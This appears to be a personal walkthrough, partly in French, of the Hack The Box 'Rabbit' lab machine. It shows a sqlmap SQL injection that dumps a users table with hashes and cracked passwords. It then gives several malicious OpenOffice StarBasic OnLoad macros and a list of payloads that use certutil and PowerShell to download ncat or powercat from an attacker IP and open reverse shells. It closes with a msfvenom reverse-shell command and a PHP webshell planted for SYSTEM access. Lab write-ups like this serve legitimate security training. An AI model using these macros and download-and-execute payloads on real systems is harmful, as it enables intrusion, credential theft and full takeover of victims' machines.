# HTB - Rabbit  10.10.10.71

Windows Server 2008 R2 Standard 
6.1.7601 Service Pack 1 Build 7601
135 hotfixs

- Complain Management System
- Microsoft-IIS/7.5
- HTTP Proxy Apache/2.4.27 (Win64) 
- PHP/5.6.31 Server 
- MySQL 5.7.19
- Outlook 2010 web App



- Enum...
- find 8080 proxy
- find http://rabbit.htb:8080/complain : Complain Management System
- Find sqli
- Dump secret table with credentials
- find https://owa : Outlook
- Read mail 
- Craft a libre office document with OnLoad Shell("...") pour télécharger et executer un reverse shell
- nc -> user => flag user
- Identifier wamp64 qui tourne en System
- Télécharger et poser un webshellphp dans c:\wamp64\www\joomla\ => flag root


## Nmap

->53

## 53 : bind

```
# dig axfr @10.10.10.71 Rabbit.htb.local
# dig axfr @10.10.10.71 rabbit.htb

; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr @10.10.10.71 rabbit.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
Nothing..




## HTTP://rabbit.htb

- Microsoft-IIS/7.5

GET / HTTP/1.1
Host: rabbit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 23 Sep 2019 02:28:25 GMT
Connection: close
Content-Length: 1233

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>403 - Forbidden: Access is denied.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>403 - Forbidden: Access is denied.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```


## http:Rabbit.htb.local:8080

HTTP Proxy 

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /robot.txt was not found on this server.</p>
<hr>
<address>Apache/2.4.27 (Win64) PHP/5.6.31 Server at rabbit.htb Port 8080</address>
</body></html>

### dirb

```



```


## http://rabbit.htb:8080/joomla/

```

Rabbit Hole, LLC	
Down the rabbit hole we go!

```
Login form



## http://rabbit.htb:8080/joomla/robots.txt
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```



### Joomscan

- Joomla 3.8.1
- Core no vuln



## http://rabbit.htb:8080/joomla/administrator/index.php

Log interface



## http://rabbit.htb:8080/complain/login.php

Server: Apache/2.4.27 (Win64) PHP/5.6.31
X-Powered-By: PHP/5.6.31

Complain Management System- Login
Powered By: <a href="http://www.techzoo.org/">TechZoo - A Zoo of Technology</a></p>

Register a client
Browse to Make complain
Look at Burp
GET /complain/view.php?mod=customer&view=compDetails HTTP/1.1

Intercept and replace customer by admin... tada...

View complain detail & assign it. Test replay with compId=9 => compId='
Sav Burp POST 

## sqlmap

```
# sqlmap -r complain_post.txt --dbms=mysql -p "compId" --risk=3 --level=3 --batch
# sqlmap -r complain_post.txt --dbms=mysql -p "compId" --risk=3 --level=3 --batch --dbs
# sqlmap -r complain_post.txt --dbms=mysql -p "compId" --risk=3 --level=3 --batch -D secret --dump

Database: secret                                                                                                                                                      
Table: users
[10 entries]
+----------+--------------------------------------------------+
| Username | Password                                         |  https://crackstation.net/
+----------+--------------------------------------------------+
| Zephon   | 13fa8abd10eed98d89fd6fc678afaf94                 |  ??
| Kain     | 33903fbcc0b1046a09edfaa0a65e8f8c                 |  doradaybendita
| Dumah    | 33da7a40473c1637f1a2e142f4925194 (popcorn)       |
| Magnus   | 370fc3559c9f0bff80543f2e1151c537                 |  xNnWo6272k7x
| Raziel   | 719da165a626b4cf23b626896c213b84                 |  kelseylovesbarry
| Moebius  | a6f30815a43f38ec6de95b9a9d74da37 (santiago)      |
| Ariel    | b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls) |
| Turel    | d322dc36451587ea2994c84c9d9717a1                 |  ??
| Dimitri  | d459f76a5eeeed0eca8ab4476c144ac4                 |  shaunamaloney
| Malek    | dea56e47f1c62c30b83b70eb281a6c39 (barcelona)     |
+----------+--------------------------------------------------+
```

### https://crackstation.net/

Use crackstation to get password





## HTTPS://Rabbit.htb.local

### gobuster

```
- /public
- /exchange   -> web auth for Exchange

- /ews        -> simple auth


## https://rabbit.htb.local/owa/ : Outlook : Ariel


```
Received
 
Wednesday, November 15, 2017 11:17 PM
Please send your weekly TPS reports to management ASAP!
Administrator

Deleted

From: Ariel <Ariel@htb.local>
To: Kain <Kain@htb.local>, Magnus <Magnus@htb.local>, Raziel
	<Raziel@htb.local>, "dimitri@htb.local" <dimitri@htb.local>
Subject: please
```


Powershell Constrained Language Mode is enabled. OpenOffice has support for macros, which can be used to gain the initial foothold.
The “New-Object” cmdlet is used in PowerShell reverse shells, but this is not an allowed type in
Constrained Language Mode.
Powershell Invoke-WebRequest (allowed in Constrained Language Mode)
Although there are documented Constrained Language Mode bypasses, the email didn’t mention
other application whitelisting controls such as AppLocker or WDAC, and so a binary payload may
be a better option.


### Generate odt file with msfvenom


```
# msfconsole 
msf5 > 
msf5 > use exploit/multi/misc/openoffice_document_macro
msf5 exploit(multi/misc/openoffice_document_macro) > set payload windows/download_exec
payload => windows/download_exec
msf5 exploit(multi/misc/openoffice_document_macro) > show options

Module options (exploit/multi/misc/openoffice_document_macro):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BODY                       no        The message for the document body
   FILENAME  msf.odt          yes       The OpoenOffice Text document name
   SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (windows/download_exec):

   Name      Current Setting                 Required  Description
   ----      ---------------                 --------  -----------
   EXE       rund11.exe                      yes       Filename to save & run executable on target system
   EXITFUNC  thread                          yes       Exit technique (Accepted: '', seh, thread, process, none)
   URL       https://localhost:443/evil.exe  yes       The pre-encoded URL to the executable


Exploit target:

   Id  Name
   --  ----
   0   Apache OpenOffice on Windows (PSH)


msf5 exploit(multi/misc/openoffice_document_macro) > set URL http://10.10.14.18:8000/evil.exe
URL => http://10.10.14.18:8000/evil.exe
msf5 exploit(multi/misc/openoffice_document_macro) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
msf5 exploit(multi/misc/openoffice_document_macro) > set SRVPORT 8888
SRVPORT => 8888
msf5 exploit(multi/misc/openoffice_document_macro) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Using URL: http://0.0.0.0:8888/AwoAkhJv2
[*] Local IP: http://10.0.2.15:8888/AwoAkhJv2
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging file: meta.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
msf5 exploit(multi/misc/openoffice_document_macro) > [*] Packaging file: META-INF/manifest.xml
[*] Packaging file: styles.xml
[*] Packaging file: mimetype
[*] Packaging file: settings.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/script-lc.xml
[*] Packaging file: content.xml
[*] Packaging file: manifest.rdf
[+] msf.odt stored at /root/.msf4/local/msf.odt

msf5 exploit(multi/misc/openoffice_document_macro) > quit

[*] Server stopped.
```

On peut aussi le faire à la main avecLibreoffice
Décrit ici : http://devloop.users.sourceforge.net/index.php?article167/solution-du-ctf-rabbit-de-hackthebox

On lance libreoffice
# libreoffice
On ouvre ou créé un doc.
Menu : [Tools/Macros/Edit macros]
Créer une macro
```
    Sub Bob
      Shell("cmd.exe /C ping -n 2 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/powercat.ps1"" c:\wamp64\www\powercat.ps1 & c:\wamp64\www\powercat.ps1 -c 10.10.14.3 -p 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 3 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" c:\wamp64\www\ncat.exe & c:\wamp64\www\ncat.exe 10.10.14.3 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 2 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Windows\Temp\ncat.exe & C:\Windows\Temp\ncat.exe 10.10.14.3 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 3 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Users\Public\ncat.exe & C:\Users\Public\ncat.exe 10.10.14.3 443 -e powershell.exe")
    End Sub
``` 
Dans Tools/Customize/Events -> Open Document lire la macro
Save


### Extract odt and replace payload

```
# cp /root/.msf4/local/msf.odt .
# mv msf.odt msf.odt.zip
# unzip msf.odt.zip 
Archive:  msf.odt.zip
  inflating: meta.xml                
  inflating: META-INF/manifest.xml   
  inflating: styles.xml              
 extracting: mimetype                
  inflating: settings.xml            
 extracting: Configurations2/accelerator/current.xml  
  inflating: Thumbnails/thumbnail.png  
  inflating: Basic/Standard/script-lb.xml  
  inflating: Basic/Standard/Module1.xml  
  inflating: Basic/script-lc.xml     
  inflating: content.xml             
  inflating: manifest.rdf          

# cat exploit/Basic/Standard/Module1.xml  
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

    Sub OnLoad
      Dim os as string
      Exploit
    End Sub

    Sub Exploit
      Shell(&quot;cmd.exe /C &quot;&quot;powershell.exe -nop -w hidden -c $V=new-object net.webclient;
      $V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
      IEX $V.downloadstring(&#39;http://10.0.2.15:8888/AwoAkhJv2&#39;);
      &quot;&quot;&quot;)
    End Sub
        
</script:module>

```
payload 1: Shell(&quot;cmd.exe /c &quot;&quot;certutil.exe  -f -split -urlcache  http://10.10.14.3:8000/nc.exe C:\Windows\Temp\nc.exe && C:\Windows\Temp\nc.exe 10.10.14.18 4444 -e cmd.exe&quot;&quot;&quot;)


payload 2: Shell(&quot;cmd.exe /C &quot;&quot;powershell.exe -c Invoke-WebRequest http://10.10.14.18/8000/plink443.exe -OutFile C:\Users\Public\plink443.exe;start C:\Users\Public\plink443.exe&quot;&quot;&quot;)


payload 2: Shell(&quot;cmd.exe /C &quot;&quot;powershell.exe -c Invoke-WebRequest http://10.10.14.3/8000/shell2.exe -OutFile C:\Users\Public\shell2.exe;start C:\Users\Public\shell2.exe&quot;&quot;&quot;)

payload 3 : powershell.exe -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.3:8000/powercat.ps1');powercat -c 10.10.14.3 -p 4444 -e cmd

payload 4 : powershell.exe -c Invoke-WebRequest http://10.10.14.3/8000/powercat.ps1 -OutFile C:\Users\Public\powercat.ps1;start powercat -c 10.10.14.3 -p 4444 -e cmd

payload 5 : certutil.exe  -f -split -urlcache  http://10.10.14.3:8000/nc.exe C:\Windows\Temp\nc.exe

payload 6 : cmd.exe /C certutil.exe  -f -split -urlcache  http://10.10.14.3:8000/nc.exe C:\Windows\Temp\nc.exe

Ultimate payload : Shell("cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.15.24/ncat.exe"" C:\Users\Public\ncat.exe & C:\Users\Public\ncat.exe 10.10.15.24 443 -e powershell.exe")

V2 : cmd.exe /c certutil.exe  -f -split -urlcache  http://10.10.14.134/nc.exe C:\Windows\Temp\nc.exe && C:\Windows\Temp\nc.exe 10.10.14.134 443 -e cmd.exe


    Sub OnLoad
      Shell("cmd.exe /C ping -n 5 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Users\Public\ncat.exe")
      Shell("cmd.exe /C C:\Users\Public\ncat.exe 10.10.14.3 443 -e cmd.exe")
    End Sub


cp ../../../tools/nc64.exe nc.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe > shell2.exe
mv shell2.exe plink443.exe

| Ariel    | b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls)



    Sub OnLoad
      Shell("cmd.exe /C ping -n 2 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/powercat.ps1"" c:\wamp64\www\powercat.ps1 & c:\wamp64\www\powercat.ps1 -c 10.10.14.3 -p 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 3 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" c:\wamp64\www\ncat.exe & c:\wamp64\www\ncat.exe 10.10.14.3 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 2 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Windows\Temp\ncat.exe & C:\Windows\Temp\ncat.exe 10.10.14.3 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 3 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Users\Public\ncat.exe & C:\Users\Public\ncat.exe 10.10.14.3 443 -e powershell.exe")
    End Sub


Après reboot du serveur, ca passe du 1er coup.
Au final, j'arrive à pinger, télécharger un programme, et un de ces 4 est passé :)

```
#  tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes



21:55:08.821337 IP rabbit.htb > kali: ICMP echo request, id 1, seq 1, length 40
21:55:08.821369 IP kali > rabbit.htb: ICMP echo reply, id 1, seq 1, length 40
21:55:08.821392 IP rabbit.htb > kali: ICMP echo request, id 1, seq 2, length 40
21:55:08.821401 IP kali > rabbit.htb: ICMP echo reply, id 1, seq 2, length 40
21:55:08.821420 IP rabbit.htb > kali: ICMP echo request, id 1, seq 3, length 40
21:55:08.821427 IP kali > rabbit.htb: ICMP echo reply, id 1, seq 3, length 40
21:55:08.821502 IP rabbit.htb > kali: ICMP echo request, id 1, seq 4, length 40
21:55:08.821512 IP kali > rabbit.htb: ICMP echo reply, id 1, seq 4, length 40
21:55:09.834982 IP rabbit.htb > kali: ICMP echo request, id 1, seq 5, length 40
21:55:09.835005 IP kali > rabbit.htb: ICMP echo reply, id 1, seq 5, length 40
21:55:09.835023 IP rabbit.htb > kali: ICMP echo request, id 1, seq 6, length 40
21:55:09.835029 IP kali > rabbit.htb: ICMP echo reply, id 1, seq 6, length 40


^C
12 packets captured
12 packets received by filter
0 packets dropped by kernel

```

## Reverse shell

```
# nc -lvp 443
listening on [any] 443 ...


connect to [10.10.14.3] from rabbit.htb [10.10.10.71] 51954
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\OpenOffice 4\program> 
PS C:\Program Files (x86)\OpenOffice 4\program> 
PS C:\Program Files (x86)\OpenOffice 4\program> whoami
whoami
htb\raziel
PS C:\Program Files (x86)\OpenOffice 4\program> systeminfo
systeminfo

Host Name:                 RABBIT
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84278
Original Install Date:     10/24/2017, 11:45:45 AM
System Boot Time:          9/23/2019, 8:41:49 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 4/5/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,256 MB
Virtual Memory: Max Size:  12,285 MB
Virtual Memory: Available: 7,232 MB
Virtual Memory: In Use:    5,053 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    htb.local
Logon Server:              \\RABBIT
Hotfix(s):                 135 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB3191566
                           [06]: KB2506014
                           [07]: KB2506212
                           [08]: KB2509553
                           [09]: KB2533623
                           [10]: KB2552343
                           [11]: KB2560656
                           [12]: KB2564958
                           [13]: KB2585542
                           [14]: KB2604115
                           [15]: KB2620704
                           [16]: KB2621440
                           [17]: KB2639308
                           [18]: KB2643719
                           [19]: KB2653956
                           [20]: KB2654428
                           [21]: KB2656356
                           [22]: KB2667402
                           [23]: KB2685939
                           [24]: KB2690533
                           [25]: KB2698365
                           [26]: KB2705219
                           [27]: KB2719033
                           [28]: KB2729094
                           [29]: KB2729452
                           [30]: KB2731771
                           [31]: KB2736422
                           [32]: KB2742599
                           [33]: KB2758857
                           [34]: KB2765809
                           [35]: KB2770660
                           [36]: KB2786081
                           [37]: KB2789645
                           [38]: KB2807986
                           [39]: KB2809215
                           [40]: KB2813430
                           [41]: KB2834140
                           [42]: KB2836942
                           [43]: KB2836943
                           [44]: KB2840631
                           [45]: KB2853587
                           [46]: KB2861698
                           [47]: KB2862152
                           [48]: KB2862330
                           [49]: KB2862335
                           [50]: KB2864202
                           [51]: KB2868038
                           [52]: KB2871997
                           [53]: KB2872035
                           [54]: KB2882822
                           [55]: KB2884256
                           [56]: KB2888049
                           [57]: KB2892074
                           [58]: KB2893294
                           [59]: KB2894844
                           [60]: KB2900986
                           [61]: KB2911501
                           [62]: KB2912390
                           [63]: KB2931356
                           [64]: KB2937610
                           [65]: KB2943357
                           [66]: KB2968294
                           [67]: KB2972100
                           [68]: KB2972211
                           [69]: KB2973112
                           [70]: KB2973201
                           [71]: KB2973351
                           [72]: KB2977292
                           [73]: KB2978120
                           [74]: KB2984972
                           [75]: KB2991963
                           [76]: KB2992611
                           [77]: KB3000483
                           [78]: KB3003743
                           [79]: KB3004361
                           [80]: KB3004375
                           [81]: KB3010788
                           [82]: KB3011780
                           [83]: KB3018238
                           [84]: KB3019978
                           [85]: KB3021674
                           [86]: KB3022777
                           [87]: KB3023215
                           [88]: KB3030377
                           [89]: KB3031432
                           [90]: KB3035126
                           [91]: KB3035132
                           [92]: KB3037574
                           [93]: KB3042058
                           [94]: KB3045685
                           [95]: KB3046017
                           [96]: KB3046269
                           [97]: KB3055642
                           [98]: KB3059317
                           [99]: KB3060716
                           [100]: KB3068457
                           [101]: KB3071756
                           [102]: KB3072305
                           [103]: KB3074543
                           [104]: KB3075220
                           [105]: KB3076895
                           [106]: KB3078601
                           [107]: KB3084135
                           [108]: KB3086255
                           [109]: KB3092601
                           [110]: KB3097989
                           [111]: KB3101722
                           [112]: KB3108371
                           [113]: KB3108381
                           [114]: KB3108664
                           [115]: KB3109103
                           [116]: KB3109560
                           [117]: KB3110329
                           [118]: KB3122648
                           [119]: KB3124275
                           [120]: KB3126587
                           [121]: KB3127220
                           [122]: KB3133043
                           [123]: KB3138612
                           [124]: KB3139398
                           [125]: KB3139914
                           [126]: KB3156016
                           [127]: KB3156019
                           [128]: KB3159398
                           [129]: KB3161949
                           [130]: KB3161958
                           [131]: KB3177467
                           [132]: KB4019990
                           [133]: KB4040980
                           [134]: KB976902
                           [135]: KB4041681
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.71
                                 [02]: fe80::284f:3ed5:97c1:7a1a
                                 [03]: dead:beef::284f:3ed5:97c1:7a1a
PS C:\Program Files (x86)\OpenOffice 4\program> 

PS C:\Program Files (x86)\OpenOffice 4\program> 
```

## On liste les process, et on regarde wamp

c:\>net start | findstr wamp
   wampapache64
   wampmysqld64

On regarde ou tourne le serveur web

c:\>sc qc wampapache64
BINARY_PATH_NAME : "c:\wamp64\...."
SERVICE_START_NAME : LocalSystem  <=== system

On vérifie les droits en ecriture 

c:\>cd c:\wamps64
c:\>icacls www

... (WD)   <== write data

WAmp64 tourne en authority\system , on place un webshell php dans son arborescence...

cd c:\wamp64\www\joomla\

cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/shell.php"" c:\wamp64\www\joomla\shell.php 

http://rabbit.htb:8080/joomla/shell.php?cmd=whoami

Shell: nt authority\system 

http://rabbit.htb:8080/joomla/shell.php?cmd=type \users\administrator\desktop\root.txt
XXXXXXXXXXXXXXXXXXXXXXx